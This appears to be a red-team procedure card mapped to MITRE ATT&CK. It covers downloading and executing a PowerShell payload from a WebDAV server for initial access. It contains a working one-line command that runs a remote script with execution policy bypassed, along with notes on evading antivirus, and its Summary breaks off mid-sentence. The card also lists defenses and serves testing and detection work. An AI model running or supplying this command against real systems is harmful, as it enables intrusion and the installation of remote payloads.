---
id: fff086f5-2c2c-4cd0-a19e-42a38206e1d0
name: Windows - Download and execute via WebDAV
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.785825+00:00'
updated_at: '2023-04-10T20:37:07.826847+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Drive-by Compromise|T1189 - Drive-by Compromise]]'
- '[[PowerShell|T1086 - PowerShell]]'
tags:
- '[[Powershell]]'
- '[[Windows - Download and execute methods]]'
commands:
- '[[Execute PowerShell Script]]'
---

# Windows - Download and execute via WebDAV

## Summary

This procedure involves using PowerShell to download and execute a payload via WebDAV. The attacker can use this method to gain initial access to a target system by compromising a legitimate website and injecting malicious code. Once the user visits the compromised site, the PowerShell script will 

## Description

# Description

This procedure involves using PowerShell to download and execute a payload via WebDAV. The attacker can use this method to gain initial access to a target system by compromising a legitimate website and injecting malicious code. Once the user visits the compromised site, the PowerShell script will execute and download the payload from the attacker's WebDAV server. This method is effective because it can bypass traditional security measures such as firewalls and antivirus software.

From a technical standpoint, the attacker will use PowerShell to create a WebDAV object and download the payload from the attacker's server. The payload can be any type of executable file, such as a trojan or backdoor. The PowerShell script can also be obfuscated to avoid detection by security software.

The business value of this procedure is that it allows an attacker to gain access to a target system and potentially exfiltrate sensitive data. This can lead to financial loss, reputational damage, and legal consequences for the victim organization.

## Requirements

1. Access to a compromised website

1. Powershell access on the target system

1. WebDAV server hosting the payload

## Defense

1. Implement web application firewalls to detect and block malicious requests to WebDAV servers

1. Monitor network traffic for any suspicious activity, such as large file transfers or unusual PowerShell commands

1. Regularly update and patch software to prevent known vulnerabilities that attackers can exploit

## Objectives

1. Gain initial access to a target system

1. Download and execute a payload via WebDAV

1. Evade detection by security software

# Instructions

1. Execute a PowerShell script from a remote Webdav server.

**Code**: [[powershell -exec bypass -f \\webdavserver\folder\p]]

> This command executes a PowerShell script from a remote Webdav server. The '-exec bypass' flag allows the script to bypass any execution policies that may be in place. The '-f' flag specifies the path to the script on the remote server. This command can be used to execute malicious payloads on target machines, so use with caution and only on systems that you have authorization to test on.

**Command** ([[Execute PowerShell Script]]):

```powershell
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Drive-by Compromise|T1189 - Drive-by Compromise]]
- [[PowerShell|T1086 - PowerShell]]

## Commands Used

- [[Execute PowerShell Script]]

## Tags

- [[Powershell]]
- [[Windows - Download and execute methods]]
